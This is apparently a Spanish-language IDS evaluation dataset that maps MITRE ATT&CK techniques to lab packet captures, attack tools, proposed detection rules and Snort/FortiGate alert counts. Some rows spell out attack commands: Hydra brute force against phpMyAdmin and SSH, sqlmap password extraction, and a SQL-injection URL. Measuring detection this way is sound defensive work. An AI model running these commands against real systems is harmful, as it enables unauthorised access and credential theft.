Reconnaissance;-;TA0043;Active Scanning;T1595;Vulnerability Scanning;T1595.002;Escaneo de vulnerabilidades;nmap;T1595.002-Port_Scanning_[3].pcapng;1;1000;0;SI;Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes;Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP);Manual [3] / 3.8.2;Manual [3] / 3.8.2.4;Manual [3] / 3.8.2.5;1;1;0;1;0;1;1;0.00;48;0.05;49;0.05;53;0.05;"""El ataque consiste en la ejecución de un comando nmap que escanea los 1000 puertos más comunes. Snort detecta que se esta realizando un analisis con nmap de puertos (SID 2009358) . Además, detecta posibles escaneo en diferentes rangos de puertos. Ejemplo: SID 2002910. Para el caso de FortiGate, sólo saltan 19 alertas, cada una avisando de un intento de descubrimiento de puerto particular""";19;0.02;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;Dirb;T1595.003-Web_page_scanning1_[2].pcapng;1;101;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb http://IP -w /usr/share/dirb/wordlist/vulns/apache.txt);Manual [2] / 3.1.1.1;Manual [2];Manual [2] / 4.1.1.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;El diccionario utilizado comprueba 101 rutas diferentes.;0;0.00;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;GoBuster;T1595.003-Web_page_scanning2_[3].pcapng;1;4614;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando GoBuster para escaneo de la estructura de directorios;Manual [3] / 3.8.4;Manual [3] / 3.8.4.4;Manual [3] / 3.8.4.5;1;1;0;1;0;1;43;0.01;57;0.01;62;0.01;74;0.02;"""El diccionario utilizado comprueba 4614 rutas diferentes. Snort detecta el acceso e intento de acceso a diferentes rutas, lo que puede llegar a indicar un posible ataque de estas características pero no detectaría todas las rutas. Para el caso de FortiGate, tan sólo se detecta el intento concreto de acceder al fichero .htpasswd, lo cual sólo abarca una de las instancias""";1;0.00;1
Reconnaissance;-;TA0043;Search Open Technical Databases;T1596;DNS/Passive DNS;T1596.001;Transferencia de zona DNS;Dirb;T1596.001-DNS_Transfer_[2].pcapng;1;1;0;SI;"""Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes ""Question"" igual a 1 y el resto a cero. Además, el campo ""Type"" debe tomar el valor ""00 FC""""";Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP);Manual [2] / 3.1.1.2;Manual [2];Manual [2] / 4.2.1.2;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Reconnaissance;-;TA0043;Phishing for Information;T1598;Spearphishing Link;T1598.003;Recogida de información de la víctima mediante ingeniería social;SEToolKit;T1598.003_Spearphishing_Link_[5].pcapng;1;1;0;NO;Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos;"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.1.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Reconnaissance;-;TA0043;Gather Victim Identity Information;T1589;Email Addresses;T1589.002;Recogida de cuentas de correo eléctronico y validación de las mismas;"""theHarvester, bulk-email-verifier""";T1589.002-Gather_victim_identity_information_[4].pcapng;1;1;0;SI;"""Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.""";-;Manual [4] / 3.1;Manual [4] / B.1;Manual [4] / 4.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Resource Development;-;TA0042;Compromise Accounts;T1586;Social Media Accounts;T1586.001;Fuerza bruta para acceso a web;Hydra;T1586.001_[2].pcapng;1;1;0;SI;Regla genérica que detecte el envío de una contraseña sobre el cuerpo de una petición HTTP POST.;"Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form ""/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server""";Manual [2] / 3.1.2.1;Manual [2];Manual [2] / 4.2.1.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Resource Development;-;TA0042;Establish Accounts;T1585;Social Media Accounts;T1585.001;Creación de cuentas de redes sociales;"""Sitios web convencionales (Facebook, Github, Microsoft ...)""";T1585.001-Establish_social_accounts_[4].pcapng;1;1;0;NO;"""Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.""";-;Manual [4] / 3.2;Manual [4] / B.2;Manual [4] / 4.2;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Envenenamiento de Caché DNS;ettercap;T1584-Cache_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.5;Manual [1] / E.16;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Secuestro / Redireccionamiento DNS;ettercap;T1584-Secuestro_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.4;Manual [1] / E.15;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.005;Botnet;T1584.005;Uso de Botnet;"""Ares, Screenshot and key logging""";T1584.005-C2018_[6].pcapng;1;1;0;NO;"""La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS…""";Uso de Ares y screenshots y key logging https://www.unb.ca/cic/datasets/ids-2018.html;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Persistence;TA0001;External Remote Services;T1133;-;-;Acceso a red VPN desde dispositivo no autorizado con credenciales robadas;OpenVPN;T1133-External_remote_services_[4].pcapng;1;1;0;NO***;"""Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).""
";"""Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso""";Manual [4] / 3.3;Manual [4] / B.3;Manual [4] / 4.3;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection1_[3].pcapng;1;1;0;SI;"""Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.""";"""Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords""";Manual [3] / 3.8.5;Manual [3] / 3.8.5.4;Manual [3] / 3.8.5.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection2_[2].pcapng;1;76;0;SI;Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.;Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords;Manual [2] / 3.1.3.1;Manual [4] / B.28;Manual [2] / 4.1.1.2;1;1;0;1;0;1;76;1.00;76;1.00;76;1.00;76;1.00;"""FG - Las dos primeras inyecciones SQL generan una alerta, el resto 2""";76;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Damn Vulnerable Web App (DVWA);T1190-Sql_injection-C2018_[6].pcapng;1;1;0;NO*;Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML;-;Dataset CIC-2018;Manual [4] / B.34;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit I - HTML Compilador;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v1_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para compilar código malware (no ejecutar);Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit II - Descarga de Ejecutable;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v2_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe;Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;-;TA0001;Hardware Additions;T1200;-;-;Añadir hardware;SSH Server + USB(Simular USB con MV con SO);T1200-Hardware_Additions_[5].pcapng;1;1;0;NO;"""Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales""";"""Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.""";Manual [5] / 3.5.2.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Attachment;T1566.001;Envío de emails con documentos maliciosos;-;T1566.001-C2018_[6].pcapng;1;1;0;NO*;"""Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados porl los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes""";-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;0;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Link;T1566.002;Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima;"""SEToolKit, Metasploit""";T1566.002-Spearphishing_Link_[5].pcapng;1;1;0;NO;"""Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware""";"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.2.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;"""Realizar una suplantación de identidad DHCP, saturando el servidor DHCP verdadero para que el servidor DHCP del atacante procese las consultas de un usuario. Posteriormente se manipula alguna consulta inyectando contenido malicioso""";"""dhcpstarv, Metasploit""";T1659-Content_Injection_[5].pcapng;1;1;0;SI;"""La detección de esta técnica será más o menos viales dependiendo del objetivo y método del atacante. Si el ataque se realiza en conjunto con protocolos de gestion(DHCP) dificultará la detección. Resultará necesario monitorizar por la distribución a traves del tráfico de red de archivos malware""";Suplantacion de identidad de DHCP Server para posteriormente inyectar contenido en la víctima con malware;Manual [5] / 3.5.2.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;Inyección;Suite aircrack-ng;T1659_Inyeccion_[1].pcapng;1;1;0;NO;"""Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas.""";-;Manual [1] / 2.5.1.1.4;Manual [1] / E.23;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Trusted Relationship;T1199;-;-;Uso de una conexión RDP sin proteger para el acceso a un equipo;RDP;T1199-Trusted_relationship_[4].pcapng;1;1;0;SI*;"""El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza""";-;Manual [4] / 3.5;Manual [4] / B.5;Manual [4] / 4.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Persistence;-;TA0003;Browser Extensions;T1176;-;-;Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor;Malicious-Browser-Extension;T1176-Browser-extension_[4].pcapng;1;1;0;NO;"""Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript""";-;Manual [4] / 3.7;Manual [4] / B.7;Manual [4] / 4.7;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Persistence;Defense Evasion;TA0003;BITS Jobs;T1197;-;-;Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo;"""BITSADMIN,METASPLOIT""";T1197-BITS_Jobs_[5].pcapng;1;1;0;NO**;Se pueden monitorizar conexiones nuevas generadas por BITS;Ejecución de comandos para la creación de una tarea BITS con rastro de red;Manual [5] / 3.5.3.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;Defense Evasion;TA0003;Pre-OS Boot;T1542;TFTP Boot;T1542.005;Modificación de imagen de SO mediante la suplantación de un Server TFTP;SSH;T1542.005-TFTP_Boot_[5].pcapng;1;1;0;NO***;**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS;Servidor TFTP utilizando Iventoy;Manual [5] / 3.5.3.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;-;TA0003;Server Software Component;T1505;SQL Stored Procedures;T1505.001;Inyección SQL;None (SQL injection using URL);T1505.001-SQL_inyection_[].pcapng;1;1;0;NO***;"**Regla genérica que detecte en la petición ""%27"" que indica la representacion de comillas simples";"Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)";Manual [3] / 3.8.7;Manual [3] / 3.8.7.4;Manual [3] / 3.8.7.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Persistence;-;TA0003;Server Software Component;T1505;Web Shell;T1505.003;Shell Web;Metasploit;T1505.005-Shell_Web_[2].pcapng;1;1;0;SI;Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.;"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web";Manual [2] / 3.1.5.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);Hydra;T1110.001-Hydra_[3].pcapng;1;1;0;NO;-;Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh;Manual [3] / 3.8.9;Manual [3] / 3.8.9.4;Manual [3] / 3.8.9.5;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);FTP - Patator;T1110.001-FTP-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.32;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);SSH - Patator;T1110.001-SSH-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.33;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Ataque sobre WPS;"""wash, reaver""";T1110-Wps_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.8;Manual [1] / E.27;Manual [4] / 4.1.34;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Spraying;T1110.003;Ataque de fuerza bruta basado en diccionario de contraseñas;wifite;T1110-Diccionario_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.7;Manual [1] / E.26;Manual [4] / 4.2.31;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;Ataque PMKID;"""hashcat, hcxpcapngtool, hcxdumptool""";T1110-pmkid_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.6.3;Manual [1] / E.25;Manual [4] / 4.2.32;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;PTW/KoreK/FMS;Suite aircrack-ng;T1110-Ptw_korek_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.5;Manual [1] / E.24;Manual [4] / 4.1.33;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Falsa autenticación;Suite aircrack-ng;T1040-Autenticacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.1;Manual [1] / E.20;Manual [4] / 4.1.26;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Acess;Discovery;TA0006;Network Sniffing;T1040;-;-;ChopChop;Suite aircrack-ng;T1040-Chopchop_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.2;Manual [1] / E.21;Manual [4] / 4.1.27;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Fragmentación;Suite aircrack-ng;T1040-Fragmentacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.3;Manual [1] / E.22;Manual [4] / 4.1.28;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Inundación MAC;Suite aircrack-ng;T1040-Mac_flood_[1].pcapng;1;1;0;NO*;"""Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias""";-;Manual [1] / 3.2;Manual [1] / E.1;Manual [4] / 4.1.29;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
